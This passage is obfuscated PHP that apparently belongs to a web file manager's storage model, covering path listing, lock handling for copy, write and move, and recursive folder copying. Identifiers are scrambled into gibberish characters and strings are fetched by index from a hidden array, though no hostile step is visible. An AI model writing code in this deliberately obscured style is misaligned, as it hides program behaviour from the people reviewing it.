$†¬Òœª…[$”êÑ–°£[$½ŸıÓµş[431]]] = $”êÑ–°£[$½ŸıÓµş[32]]; } } $ú âÜ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Á«‘³¤ = array(); foreach ($Ó”‰”»† as &$Æ–òÛŒ×) { $½ö¸Ü§š = $Æ–òÛŒ×[$½ŸıÓµş[540]]; $Á‡–ßø· = $½ŸıÓµş[12]; if (isset($Á«‘³¤[$½ö¸Ü§š])) { $Á‡–ßø· = $Á«‘³¤[$½ö¸Ü§š]; } else { $Ø½¿‡é¸ = $this->parentLevelArray($Æ–òÛŒ×[$½ŸıÓµş[540]]); foreach ($Ø½¿‡é¸ as $éµØ®¹Ò => $Ğ®ê¨í) { if (isset($†¬Òœª…[$Ğ®ê¨í])) { $Á‡–ßø· .= $†¬Òœª…[$Ğ®ê¨í] . $½ŸıÓµş[8]; } } $Á«‘³¤[$½ö¸Ü§š] = $Á‡–ßø·; } $Á‡–ßø· .= $Æ–òÛŒ×[$½ŸıÓµş[32]]; if ($Æ–òÛŒ×[$½ŸıÓµş[439]] == $½ŸıÓµş[88]) { $Á‡–ßø· .= $½ŸıÓµş[8]; } $Æ–òÛŒ×[$½ŸıÓµş[538]] = str_replace($½ŸıÓµş[548], $½ŸıÓµş[8], $Á‡–ßø·); if ($Æ–òÛŒ×[$½ŸıÓµş[461]] == $½ŸıÓµş[198]) { $Æ–òÛŒ×[$½ŸıÓµş[32]] = trim($†¬Òœª…[$Æ–òÛŒ×[$½ŸıÓµş[431]]], $½ŸıÓµş[8]); $Æ–òÛŒ×[$½ŸıÓµş[538]] = $Æ–òÛŒ×[$½ŸıÓµş[32]] . $½ŸıÓµş[8]; } if (intval($Æ–òÛŒ×[$½ŸıÓµş[440]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Æ–òÛŒ×, $Ø½¿‡é¸, $ú âÜ); } } unset($Æ–òÛŒ×); return $Ó”‰”»†; } private function _listAppendPathRecycle(&$°Òé¤©ô, $Œõ¡œã´, $á„¼ä¤Ÿ) { $›Ó¤¯Òˆ =& $_SERVER[…É¦À–]; if (!in_array($á„¼ä¤Ÿ, $Œõ¡œã´) && $°Òé¤©ô[$›Ó¤¯Òˆ[431]] != $á„¼ä¤Ÿ) { return; } $èªÂü = explode($›Ó¤¯Òˆ[8], trim($°Òé¤©ô[$›Ó¤¯Òˆ[538]], $›Ó¤¯Òˆ[8])); $“è—Ò»® = implode($›Ó¤¯Òˆ[8], array_slice($èªÂü, 2)); $°Òé¤©ô[$›Ó¤¯Òˆ[538]] = $›Ó¤¯Òˆ[8] . LNG($›Ó¤¯Òˆ[549]) . $›Ó¤¯Òˆ[8] . ltrim($“è—Ò»®, $›Ó¤¯Òˆ[8]); $°Òé¤©ô[$›Ó¤¯Òˆ[540]] = $›Ó¤¯Òˆ[550] . implode($›Ó¤¯Òˆ[50], array_slice($Œõ¡œã´, 1)) . $›Ó¤¯Òˆ[50]; if ($°Òé¤©ô[$›Ó¤¯Òˆ[431]] == $á„¼ä¤Ÿ) { $°Òé¤©ô[$›Ó¤¯Òˆ[540]] = $›Ó¤¯Òˆ[550]; $°Òé¤©ô[$›Ó¤¯Òˆ[461]] = $›Ó¤¯Òˆ[198]; $°Òé¤©ô[$›Ó¤¯Òˆ[32]] = LNG($›Ó¤¯Òˆ[549]); } $°Òé¤©ô[$›Ó¤¯Òˆ[551]] = $›Ó¤¯Òˆ[552]; } protected function _listAppendPathRoot(&$ø„¹ô«, $ÖÇ…´Úœ) { $™Çóşœ¹ =& $_SERVER[…É¦À–]; static $û©îæ±È = false; $ä“²¯°Ş = $™Çóşœ¹[12]; if ($ø„¹ô«[$™Çóşœ¹[440]] == self::TYPE_USER) { if ($ø„¹ô«[$™Çóşœ¹[525]] == USER_ID) { $ä“²¯°Ş = LNG($™Çóşœ¹[553]); if ($û©îæ±È === !1) { $±ìŞÄ‚„ = Model($™Çóşœ¹[554])->getInfoFull(USER_ID); $û©îæ±È = _get($±ìŞÄ‚„, $™Çóşœ¹[555], $™Çóşœ¹[12]); } if ($ÖÇ…´Úœ && $ÖÇ…´Úœ[0] == $û©îæ±È || !$ÖÇ…´Úœ && $ø„¹ô«[$™Çóşœ¹[431]] == $û©îæ±È) { $ä“²¯°Ş = LNG($™Çóşœ¹[556]); $ø„¹ô«[$™Çóşœ¹[557]] = $™Çóşœ¹[558]; } if (!$ÖÇ…´Úœ) { $ø„¹ô«[$™Çóşœ¹[32]] = $ä“²¯°Ş; } } else { $»Ò±Ûè = Model($™Çóşœ¹[533])->getInfoSimple($ø„¹ô«[$™Çóşœ¹[525]]); $ä“²¯°Ş = LNG($™Çóşœ¹[559]) . $™Çóşœ¹[162] . $»Ò±Ûè[$™Çóşœ¹[32]] . $™Çóşœ¹[164]; $ø„¹ô«[$™Çóşœ¹[560]] = array($™Çóşœ¹[32] => $»Ò±Ûè[$™Çóşœ¹[32]], $™Çóşœ¹[561] => $»Ò±Ûè[$™Çóşœ¹[561]], $™Çóşœ¹[562] => $»Ò±Ûè[$™Çóşœ¹[562]]); } } else { if ($ø„¹ô«[$™Çóşœ¹[440]] == self::TYPE_GROUP) { $»Ò±Ûè = Model($™Çóşœ¹[541])->getInfoSimple($ø„¹ô«[$™Çóşœ¹[525]]); $ä“²¯°Ş = $»Ò±Ûè[$™Çóşœ¹[32]]; } else { if ($ø„¹ô«[$™Çóşœ¹[440]] == self::TYPE_SYSTEM) { $ä“²¯°Ş = $™Çóşœ¹[563]; } } } $ä“²¯°Ş = $ä“²¯°Ş ? $™Çóşœ¹[8] . $ä“²¯°Ş . $™Çóşœ¹[8] : $™Çóşœ¹[8]; return $ä“²¯°Ş; } protected function _listAppendUser(&$íÇÛ¦«¬) { $ˆí°«ã¨ =& $_SERVER[…É¦À–]; $•¤´“ï = array_to_keyvalue($íÇÛ¦«¬, $ˆí°«ã¨[12], $ˆí°«ã¨[483]); $Ñ¹­Àœ = array_to_keyvalue($íÇÛ¦«¬, $ˆí°«ã¨[12], $ˆí°«ã¨[485]); $ØÀñª“§ = array_merge($•¤´“ï, $Ñ¹­Àœ); $ĞŒ¾Ìˆû = Model($ˆí°«ã¨[554])->userListInfo($ØÀñª“§); foreach ($íÇÛ¦«¬ as &$é‘Éü”÷) { $ğ¸èöÚÜ = $é‘Éü”÷[$ˆí°«ã¨[483]]; $é‘Éü”÷[$ˆí°«ã¨[483]] = $ĞŒ¾Ìˆû[$ğ¸èöÚÜ] ? $ĞŒ¾Ìˆû[$ğ¸èöÚÜ] : !1; $ğ¸èöÚÜ = $é‘Éü”÷[$ˆí°«ã¨[485]]; $é‘Éü”÷[$ˆí°«ã¨[485]] = $ĞŒ¾Ìˆû[$ğ¸èöÚÜ] ? $ĞŒ¾Ìˆû[$ğ¸èöÚÜ] : !1; if (isset($é‘Éü”÷[$ˆí°«ã¨[495]]) && $é‘Éü”÷[$ˆí°«ã¨[495]][$ˆí°«ã¨[564]]) { $Ìş°Ş… = $GLOBALS[$ˆí°«ã¨[6]][$ˆí°«ã¨[89]][$ˆí°«ã¨[565]]; if ($é‘Éü”÷[$ˆí°«ã¨[495]][$ˆí°«ã¨[566]] <= time() - $Ìş°Ş…) { $this->metaSet($é‘Éü”÷[$ˆí°«ã¨[431]], $ˆí°«ã¨[564], null); $this->metaSet($é‘Éü”÷[$ˆí°«ã¨[431]], $ˆí°«ã¨[566], null); unset($é‘Éü”÷[$ˆí°«ã¨[495]][$ˆí°«ã¨[564]]); continue; } $µ¸Ê…÷Ş = $é‘Éü”÷[$ˆí°«ã¨[495]][$ˆí°«ã¨[564]]; $é‘Éü”÷[$ˆí°«ã¨[495]][$ˆí°«ã¨[567]] = Model($ˆí°«ã¨[554])->getInfoSimpleOuter($µ¸Ê…÷Ş); } } unset($é‘Éü”÷); } public function parentLevelArray($£ïî§Ñ³) { $©¨Õ½µñ =& $_SERVER[…É¦À–]; $£ïî§Ñ³ = explode($©¨Õ½µñ[50], trim($£ïî§Ñ³, $©¨Õ½µñ[50])); return array_remove_value($£ïî§Ñ³, $©¨Õ½µñ[198]); } public function listAll($„ó¿æÙ) { $àÖí¥ÌĞ =& $_SERVER[…É¦À–]; $şƒ¬å’š = $this->sourceInfo($„ó¿æÙ); $Œ¯£¦½· = array($àÖí¥ÌĞ[568] => array($àÖí¥ÌĞ[569], $şƒ¬å’š[$àÖí¥ÌĞ[540]] . $„ó¿æÙ . $àÖí¥ÌĞ[570]), $àÖí¥ÌĞ[571] => 0); $Âüßó•± = $àÖí¥ÌĞ[572]; $Úñë ú = "\114\105\106\x54\40\112\x4f\111\x4e\x20{$this->tablePrefix}\x69\x6f\137\x66\x69\154\145\40\x66\x69\154\145\40\x6f\x6e\40\x73\157\x75\162\143\x65\56\x66\x69\154\145\x49\x44\x20\x3d\x20\x66\151\154\145\x2e\x66\151\154\x65\x49\x44"; $œµÁ–Ë¥ = $this->alias($àÖí¥ÌĞ[475])->field($Âüßó•±)->where($Œ¯£¦½·)->join($Úñë ú)->select(); $this->_listAppendAuth($œµÁ–Ë¥); $this->_listAppendUser($œµÁ–Ë¥); $this->_listAppendPath($œµÁ–Ë¥); $œµÁ–Ë¥ = array_to_keyvalue($œµÁ–Ë¥, $àÖí¥ÌĞ[431]); $Ğ““É„¯ = "\x2f{$şƒ¬å’š[$àÖí¥ÌĞ[32]]}\x2f"; $Ğ““É„¯ = $Ğ““É„¯ == $àÖí¥ÌĞ[548] ? $àÖí¥ÌĞ[8] : $Ğ““É„¯; $é™•š»· = array(); foreach ($œµÁ–Ë¥ as $Ê±¢Ñ‹ö => $èŸæ“•Ï) { $şèáˆÖÁ = $this->parentLevelArray($èŸæ“•Ï[$àÖí¥ÌĞ[540]]); array_shift($şèáˆÖÁ); $‹ù÷´£Œ = $Ğ““É„¯; for ($´‘ŠÕã = 0; $´‘ŠÕã < count($şèáˆÖÁ); $´‘ŠÕã++) { $‹ù÷´£Œ .= $œµÁ–Ë¥[$şèáˆÖÁ[$´‘ŠÕã]][$àÖí¥ÌĞ[32]] . $àÖí¥ÌĞ[8]; } $‹ù÷´£Œ .= $èŸæ“•Ï[$àÖí¥ÌĞ[32]]; if ($èŸæ“•Ï[$àÖí¥ÌĞ[439]]) { $‹ù÷´£Œ .= $àÖí¥ÌĞ[8]; } $ïÔ£İÁ‰ = array($àÖí¥ÌĞ[450] => str_replace($àÖí¥ÌĞ[548], $àÖí¥ÌĞ[8], str_replace($àÖí¥ÌĞ[548], $àÖí¥ÌĞ[8], str_replace($àÖí¥ÌĞ[548], $àÖí¥ÌĞ[8], $‹ù÷´£Œ))), $àÖí¥ÌĞ[573] => intval($èŸæ“•Ï[$àÖí¥ÌĞ[439]]), $àÖí¥ÌĞ[574] => intval($èŸæ“•Ï[$àÖí¥ÌĞ[76]]), $àÖí¥ÌĞ[85] => intval($èŸæ“•Ï[$àÖí¥ÌĞ[85]]), $àÖí¥ÌĞ[87] => $this->pathInfoFilter($èŸæ“•Ï)); if (!$ïÔ£İÁ‰[$àÖí¥ÌĞ[439]]) { $ïÔ£İÁ‰[$àÖí¥ÌĞ[497]] = $èŸæ“•Ï[$àÖí¥ÌĞ[497]]; } $é™•š»·[] = $ïÔ£İÁ‰; } $é™•š»· = array_sort_by($é™•š»·, $àÖí¥ÌĞ[84]); return $é™•š»·; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Œ»ŞĞê§) { $êÖÃ™²µ =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $this->_lockCheck($êÖÃ™²µ[575], $Œ»ŞĞê§); $ÒÍë›¿ = 1; $this->_lockEvent($Œ»ŞĞê§, array($êÖÃ™²µ[576], $êÖÃ™²µ[577]), $ÒÍë›¿); $this->_lockParent($Œ»ŞĞê§, array($êÖÃ™²µ[577]), $ÒÍë›¿); $this->_lockEvent($Œ»ŞĞê§, array($êÖÃ™²µ[578], $êÖÃ™²µ[579]), $ÒÍë›¿); $this->_lockCheckEnd($êÖÃ™²µ[575], $Œ»ŞĞê§); } public function lockCopyEnd($Ñ…Åöğä) { $éö™¾¿° =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $ùÖü›¢ = 0; $this->_lockEvent($Ñ…Åöğä, array($éö™¾¿°[576], $éö™¾¿°[577]), $ùÖü›¢); $this->_lockParent($Ñ…Åöğä, array($éö™¾¿°[577]), $ùÖü›¢); $this->_lockEvent($Ñ…Åöğä, array($éö™¾¿°[578], $éö™¾¿°[579]), $ùÖü›¢); } public function lockWriteStart($àÓäô‰, $¦¶òÅ = '') { $ÃÏÂ¸úì =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÃÏÂ¸úì[576], $àÓäô‰); $ºğ‹öÊô = 1; $this->_lockKey($ÃÏÂ¸úì[580] . $àÓäô‰ . $ÃÏÂ¸úì[10] . $¦¶òÅ, $ºğ‹öÊô); $this->_lockEvent($àÓäô‰, array($ÃÏÂ¸úì[575], $ÃÏÂ¸úì[577]), $ºğ‹öÊô); $this->_lockParent($àÓäô‰, array($ÃÏÂ¸úì[575], $ÃÏÂ¸úì[577]), $ºğ‹öÊô); $this->_lockCheckEnd($ÃÏÂ¸úì[576], $àÓäô‰); } public function lockWriteEnd($¬‘Ì¡äÕ, $¤—îêÜ… = '') { $’ÖŠ©ÃÙ =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $éñí­¢í = 0; $this->_lockKey($’ÖŠ©ÃÙ[580] . $¬‘Ì¡äÕ . $’ÖŠ©ÃÙ[10] . $¤—îêÜ…, $éñí­¢í); $this->_lockEvent($¬‘Ì¡äÕ, array($’ÖŠ©ÃÙ[575], $’ÖŠ©ÃÙ[577]), $éñí­¢í); $this->_lockParent($¬‘Ì¡äÕ, array($’ÖŠ©ÃÙ[575], $’ÖŠ©ÃÙ[577]), $éñí­¢í); } public function lockMoveStart($´›Ñ¾Ì£) { $ù¸ƒ±„Ï =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $this->_lockCheck($ù¸ƒ±„Ï[577], $´›Ñ¾Ì£); $ã£Ö‘¿š = 1; $this->_lockKey($ù¸ƒ±„Ï[581] . $´›Ñ¾Ì£, $ã£Ö‘¿š); $this->_lockEvent($´›Ñ¾Ì£, array($ù¸ƒ±„Ï[575], $ù¸ƒ±„Ï[576]), $ã£Ö‘¿š); $this->_lockParent($´›Ñ¾Ì£, array($ù¸ƒ±„Ï[575], $ù¸ƒ±„Ï[577]), $ã£Ö‘¿š); $this->_lockEvent($´›Ñ¾Ì£, array($ù¸ƒ±„Ï[582], $ù¸ƒ±„Ï[578], $ù¸ƒ±„Ï[579]), $ã£Ö‘¿š); $this->_lockCheckEnd($ù¸ƒ±„Ï[577], $´›Ñ¾Ì£); } public function lockMoveEnd($‰•›¡®) { $€êÍ§–ñ =& $_SERVER[…É¦À–]; if (!$this->allowLock()) { return; } $ìì™‡ÁË = 0; $this->_lockKey($€êÍ§–ñ[581] . $‰•›¡®, $ìì™‡ÁË); $this->_lockEvent($‰•›¡®, array($€êÍ§–ñ[575], $€êÍ§–ñ[576]), $ìì™‡ÁË); $this->_lockParent($‰•›¡®, array($€êÍ§–ñ[575], $€êÍ§–ñ[577]), $ìì™‡ÁË); $this->_lockEvent($‰•›¡®, array($€êÍ§–ñ[582], $€êÍ§–ñ[578], $€êÍ§–ñ[579]), $ìì™‡ÁË); } private function _lockCheck($ÌæÃªæœ, $ß‡Ì¸È) { $÷ö†é =& $_SERVER[…É¦À–]; $ÅËÛ“‰ = $this->sourceInfo($ß‡Ì¸È); $¶£Ìº‹Ø = $ÌæÃªæœ . $÷ö†é[10] . $ß‡Ì¸È; $this->_lockTimeStart[$¶£Ìº‹Ø] = timeFloat(); if (!is_array($ÅËÛ“‰)) { return; } $ø¦¼î©¬ = LNG($÷ö†é[583]); CacheLock::setErrorMsg($÷ö†é[162] . htmlspecialchars($ÅËÛ“‰[$÷ö†é[32]]) . $÷ö†é[164] . $ø¦¼î©¬); $this->_lockKey($¶£Ìº‹Ø, 1); $this->_lockKey($¶£Ìº‹Ø, 0); $©âÑçÀ„ = array_reverse($this->parentLevelArray($ÅËÛ“‰[$÷ö†é[540]])); foreach ($©âÑçÀ„ as $ÉÕñ¸’ˆ) { $¶£Ìº‹Ø = $ÌæÃªæœ . $÷ö†é[584] . $ÉÕñ¸’ˆ; if (CacheLock::lockGet($÷ö†é[585] . $¶£Ìº‹Ø)) { $ÅËÛ“‰ = $this->sourceInfo($ÉÕñ¸’ˆ); CacheLock::setErrorMsg($÷ö†é[162] . htmlspecialchars($ÅËÛ“‰[$÷ö†é[32]]) . $÷ö†é[164] . $ø¦¼î©¬); $this->_lockKey($¶£Ìº‹Ø, 1); $this->_lockKey($¶£Ìº‹Ø, 0); } } } private function _lockCheckEnd($ÏÃ°È•¿, $¹¯¢³Îñ) { $ê€ÄÁ¼ø =& $_SERVER[…É¦À–]; $Š»°–’Â = $ÏÃ°È•¿ . $ê€ÄÁ¼ø[10] . $¹¯¢³Îñ; CacheLock::setErrorMsg($ê€ÄÁ¼ø[407]); if (!isset($this->_lockTimeStart[$Š»°–’Â])) { return; } $¿“’½¿˜ = timeFloat() - $this->_lockTimeStart[$Š»°–’Â]; unset($this->_lockTimeStart[$Š»°–’Â]); if ($¿“’½¿˜ > 0.5) { unset(self::$cacheSourceInfo[$ê€ÄÁ¼ø[489] . $¹¯¢³Îñ]); } $×°‰œç‡ = $this->sourceInfo($¹¯¢³Îñ); if (!$×°‰œç‡) { show_json(LNG($ê€ÄÁ¼ø[105]), !1); } } private function _lockParent($šÔ×Ïù”, $§Şü²Üë, $ºÎ ©‰§) { if (!$this->autoLockSet) { return; } $õƒÖ¥ÎÉ = $this->sourceInfo($šÔ×Ïù”); if (!is_array($õƒÖ¥ÎÉ)) { return; } $©´®Ê‚ù = array_reverse($this->parentLevelArray($õƒÖ¥ÎÉ[$_SERVER[…É¦À–][540]])); foreach ($©´®Ê‚ù as $Íßğí‘) { $this->_lockEvent($Íßğí‘, $§Şü²Üë, $ºÎ ©‰§); } } private function _lockEvent($‘Ü’ÈÏÇ, $ËÍÒËÊ¨, $ãÖá¯øÅ) { $õ¶àôü =& $_SERVER[…É¦À–]; if (!$this->autoLockSet) { return; } foreach ($ËÍÒËÊ¨ as $ïØıã¤Š) { $®™§Åæˆ = $ïØıã¤Š . $õ¶àôü[10] . $‘Ü’ÈÏÇ; if ($ãÖá¯øÅ && CacheLock::lockGet($õ¶àôü[585] . $®™§Åæˆ)) { continue; } $this->_lockKey($®™§Åæˆ, $ãÖá¯øÅ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($‚¯×ò€Ó, $ÓùùúÕŒ = 1) { $§Æá©ÇĞ = $_SERVER[…É¦À–][585] . md5($‚¯×ò€Ó); if ($ÓùùúÕŒ) { if (isset(self::$_lockItemArr[$§Æá©ÇĞ])) { return; } self::$_lockItemArr[$§Æá©ÇĞ] = 1; CacheLock::lock($§Æá©ÇĞ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$§Æá©ÇĞ])) { return; } unset(self::$_lockItemArr[$§Æá©ÇĞ]); CacheLock::unlock($§Æá©ÇĞ); } } public function isParentOf($®ş›Ø, $ú“¸‚¨°) { $Êçâ™´³ =& $_SERVER[…É¦À–]; $¦ôÃ›õ« = $this->sourceInfo($®ş›Ø); $‹äºÉÊ = $this->sourceInfo($ú“¸‚¨°); $ş¦òò – = $¦ôÃ›õ«[$Êçâ™´³[540]] . $¦ôÃ›õ«[$Êçâ™´³[431]] . $Êçâ™´³[50]; $†½§‰ = $‹äºÉÊ[$Êçâ™´³[540]] . $‹äºÉÊ[$Êçâ™´³[431]] . $Êçâ™´³[50]; $ì®øæÚæ = strpos($†½§‰, $ş¦òò –) === 0; return $ì®øæÚæ; } private $targetIsDelete = 0; public function copy($¿Ô¬˜‹˜, $Õ˜²Û„È, $Š€˜–ï = REPEAT_REPLACE, $£Ç¢œøü = '') { $Û”…Ö÷™ =& $_SERVER[…É¦À–]; $¤ıÑ‚ = $this->sourceInfo($¿Ô¬˜‹˜); $åİ¨âÇÈ = $this->sourceInfo($Õ˜²Û„È); if (!$¤ıÑ‚ || !$åİ¨âÇÈ || $åİ¨âÇÈ[$Û”…Ö÷™[439]] != $Û”…Ö÷™[88]) { return !1; } if ($this->isParentOf($¿Ô¬˜‹˜, $Õ˜²Û„È)) { return !1; } $®µŒòûœ = $£Ç¢œøü ? $£Ç¢œøü : $¤ıÑ‚[$Û”…Ö÷™[32]]; $this->lockCopyStart($¿Ô¬˜‹˜); $this->lockWriteStart($Õ˜²Û„È, $®µŒòûœ); $†ãäîĞ† = array($Û”…Ö÷™[586] => array(), $Û”…Ö÷™[587] => array(), $Û”…Ö÷™[588] => array()); $this->targetIsDelete = intval($¤ıÑ‚[$Û”…Ö÷™[460]]); $ƒÀ¦”¤Á = $this->fileNameExistCache($Õ˜²Û„È, $¤ıÑ‚[$Û”…Ö÷™[32]]); $£åÂ«á² = $this->_copy($¿Ô¬˜‹˜, $Õ˜²Û„È, $Š€˜–ï, $†ãäîĞ†, !0, $£Ç¢œøü); $this->_childrenListClear(); $this->lockCopyEnd($¿Ô¬˜‹˜); $this->lockWriteEnd($Õ˜²Û„È, $®µŒòûœ); if ($¤ıÑ‚[$Û”…Ö÷™[439]] == $Û”…Ö÷™[88] && $ƒÀ¦”¤Á == $£åÂ«á²) { $this->folderSizeResetChildren($ƒÀ¦”¤Á); } Model($Û”…Ö÷™[589])->addAll($†ãäîĞ†[$Û”…Ö÷™[587]], array(), !0); if ($ƒÀ¦”¤Á != $£åÂ«á² || $¤ıÑ‚[$Û”…Ö÷™[439]] == $Û”…Ö÷™[88]) { Model($Û”…Ö÷™[590])->eventCopy($£åÂ«á²); } $this->saveAll($†ãäîĞ†[$Û”…Ö÷™[588]]); Model($Û”…Ö÷™[200])->linkAdd($†ãäîĞ†[$Û”…Ö÷™[586]]); $this->folderSizeReset($Õ˜²Û„È); $this->updateModifyTime($Õ˜²Û„È); return $£åÂ«á²; } private function _copy($Ç°üä×–, $ŸµôƒÛ´, $İı’Í», &$Ê¦êêû„, $ Ò‹Ò®¨, $îï³±¹Ë = '') { $´åûíŠÌ =& $_SERVER[…É¦À–]; $±ÈÈ—â» = $this->sourceInfoCache($Ç°üä×–); $ŸËÊàĞ¨ = $±ÈÈ—â»[$´åûíŠÌ[439]] == $´åûíŠÌ[88]; $¥ìÃßÑ = $îï³±¹Ë ? $îï³±¹Ë : $±ÈÈ—â»[$´åûíŠÌ[32]]; $‰·ä’ê = $this->fileNameExistCache($ŸµôƒÛ´, $¥ìÃßÑ); if ($ Ò‹Ò®¨) { $this->_childrenAllMake($Ç°üä×–); if ($ŸËÊàĞ¨ && $‰·ä’ê) { $this->_childrenAllMake($‰·ä’ê); } } if (!$‰·ä’ê) { return $this->_copyCreate($Ç°üä×–, $ŸµôƒÛ´, $¥ìÃßÑ, $Ê¦êêû„); } $Ã’Œ¶»· = $‰·ä’ê; if ($ŸËÊàĞ¨) { if ($İı’Í» == REPEAT_RENAME_FOLDER) { $¥ìÃßÑ = $this->fileNameAutoCache($ŸµôƒÛ´, $¥ìÃßÑ, $İı’Í», $ŸËÊàĞ¨); $Ã’Œ¶»· = $this->_copyCreate($Ç°üä×–, $ŸµôƒÛ´, $¥ìÃßÑ, $Ê¦êêû„); } else { $š¡÷—ñª = $this->_childrenList($Ç°üä×–); foreach ($š¡÷—ñª as $Ğç¦¬àô) { $this->_copy($Ğç¦¬àô[$´åûíŠÌ[431]], $‰·ä’ê, $İı’Í», $Ê¦êêû„, !1); } } } else { if ($İı’Í» == REPEAT_RENAME || $İı’Í» == REPEAT_RENAME_FOLDER) { $¥ìÃßÑ = $this->fileNameAutoCache($ŸµôƒÛ´, $¥ìÃßÑ, $İı’Í», $ŸËÊàĞ¨); $Ã’Œ¶»· = $this->_copyCreate($Ç°üä×–, $ŸµôƒÛ´, $¥ìÃßÑ, $Ê¦êêû„); } else { if ($İı’Í» == REPEAT_REPLACE) { $åû¼¤¹Ü = $this->sourceInfoCache($‰·ä’ê); $›º×€Ï = $this->fileHistory($åû¼¤¹Ü, $±ÈÈ—â»[$´åûíŠÌ[497]], $±ÈÈ—â»[$´åûíŠÌ[76]]); if ($›º×€Ï) { $Ê¦êêû„[$´åûíŠÌ[586]][] = $±ÈÈ—â»[$´åûíŠÌ[497]]; } } else { if ($İı’Í» == REPEAT_SKIP) { } } } Hook::trigger($´åûíŠÌ[591], array($´åûíŠÌ[592], $±ÈÈ—â», 0)); } return $Ã’Œ¶»·; } private function _copyCreate($ãÄß³Ç, $æÌ®ÒË, $ù ‰ , &$„Â‹Ã¹) { $³êãæ»õ =& $_SERVER[…É¦À–]; $İÂ¹¯î = $this->sourceInfoCache($ãÄß³Ç); $¦Ö ‰ñ¿ = $this->sourceInfoCache($æÌ®ÒË); $¯Şç¶»û = $this->_makeItemData($İÂ¹¯î, $¦Ö ‰ñ¿, $ù ‰ ); Hook::trigger($³êãæ»õ[593], $¯Şç¶»û); Hook::trigger($³êãæ»õ[594], array($³êãæ»õ[595], $¯Şç¶»û, 0)); $ßå€ÊĞ´ = $this->add($¯Şç¶»û); $äàòÓÁâ = array($³êãæ»õ[431] => $ßå€ÊĞ´, $³êãæ»õ[32] => $ù ‰ ); $this->_copyApplyMeta($äàòÓÁâ, $„Â‹Ã¹); if ($İÂ¹¯î[$³êãæ»õ[439]] != $³êãæ»õ[88]) { $„Â‹Ã¹[$³êãæ»õ[586]][] = $İÂ¹¯î[$³êãæ»õ[497]]; return $ßå€ÊĞ´; } $œÌ­’Õò = array(); $»€½…Ì = array(); $this->_childrenListAll($ãÄß³Ç, $œÌ­’Õò); $Í·µûª = count($œÌ­’Õò); if ($Í·µûª == 0) { return $ßå€ÊĞ´; } $À¯ß·æ¦ = $this->sourceInfo($ßå€ÊĞ´); foreach ($œÌ­’Õò as $§²Ç¿Äı) { $í•ÇàØ÷ = $this->_makeItemData($§²Ç¿Äı, $À¯ß·æ¦, $§²Ç¿Äı[$³êãæ»õ[32]]); $í•ÇàØ÷[$³êãæ»õ[540]] = $§²Ç¿Äı[$³êãæ»õ[540]]; $»€½…Ì[] = $í•ÇàØ÷; } $this->chunkEventSet($³êãæ»õ[596], array($³êãæ»õ[597], $¯Şç¶»û, $Í·µûª)); $this->addAll($»€½…Ì, array(), !1); $Œİ…÷—— = $this->where(array($³êãæ»õ[461] => $ßå€ÊĞ´))->select(); $ÓĞƒ ëí = $this->_childrenMakeRelation($œÌ­’Õò, $Œİ…÷——); $ÓĞƒ ëí[$ãÄß³Ç] = $ßå€ÊĞ´; $Àå¦…È§ = array(); $›¡ª©®˜ = array(); foreach ($Œİ…÷—— as $§²Ç¿Äı) { $£å¿ÌöÖ = $§²Ç¿Äı[$³êãæ»õ[431]]; $¬Ÿ—”âù = $this->_childrenMatch($ÓĞƒ ëí, $§²Ç¿Äı, $À¯ß·æ¦); $Àå¦…È§[] = array($³êãæ»õ[431], $£å¿ÌöÖ, $³êãæ»õ[461], $¬Ÿ—”âù[$³êãæ»õ[461]]); $›¡ª©®˜[] = array($³êãæ»õ[431], $£å¿ÌöÖ, $³êãæ»õ[540], $¬Ÿ—”âù[$³êãæ»õ[540]]); $this->_copyApplyMeta($§²Ç¿Äı, $„Â‹Ã¹); if ($§²Ç¿Äı[$³êãæ»õ[439]] != $³êãæ»õ[88]) { $„Â‹Ã¹[$³êãæ»õ[586]][] = $§²Ç¿Äı[$³êãæ»õ[497]]; } } $this->chunkEventSet($³êãæ»õ[598], array($³êãæ»õ[599], $¯Şç¶»û, $Í·µûª)); $this->saveAll($Àå¦…È§); $this->chunkEventSet($³êãæ»õ[600], array($³êãæ»õ[601], $¯Şç¶»û, $Í·µûª)); $this->saveAll($›¡ª©®˜); return $ßå€ÊĞ´; } private function _childrenMakeRelation($ÜäéÄÊ§, $Òºø”á…) { $Ëø¨ÅÁŠ =& $_SERVER[…É¦À–]; $®Ééøó¼ = array(); $ğşÄ¸Ò‘ = array(); foreach ($ÜäéÄÊ§ as $ş„¶íÌÒ) { $Ì¸Ş´ = $ş„¶íÌÒ[$Ëø¨ÅÁŠ[32]] . $Ëø¨ÅÁŠ[8] . $ş„¶íÌÒ[$Ëø¨ÅÁŠ[540]]; $®Ééøó¼[$Ì¸Ş´] = $ş„¶íÌÒ[$Ëø¨ÅÁŠ[431]]; } foreach ($Òºø”á… as $ş„¶íÌÒ) { $Ì¸Ş´ = $ş„¶íÌÒ[$Ëø¨ÅÁŠ[32]] . $Ëø¨ÅÁŠ[8] . $ş„¶íÌÒ[$Ëø¨ÅÁŠ[540]]; $ª«·ÇÛ× = $®Ééøó¼[$Ì¸Ş´]; $ğşÄ¸Ò‘[$ª«·ÇÛ×] = $ş„¶íÌÒ[$Ëø¨ÅÁŠ[431]]; } return $ğşÄ¸Ò‘; } private function _childrenMatch($î¤ûÕ²Š, $Şó••Ô™, $Ú£Ì¼¯–) { $½ÌÀáæ =& $_SERVER[…É¦À–]; $ÜÒóëÒÏ = $Ú£Ì¼¯–[$½ÌÀáæ[540]]; $ŒÄø•ü£ = $this->parentLevelArray($Şó••Ô™[$½ÌÀáæ[540]]); foreach ($ŒÄø•ü£ as $°ÌŸÂ) { if (isset($î¤ûÕ²Š[$°ÌŸÂ])) { $ÜÒóëÒÏ .= $î¤ûÕ²Š[$°ÌŸÂ] . $½ÌÀáæ[602]; } } $ÜÒóëÒÏ = rtrim($ÜÒóëÒÏ, $½ÌÀáæ[50]) . $½ÌÀáæ[50]; $Ç•’ = 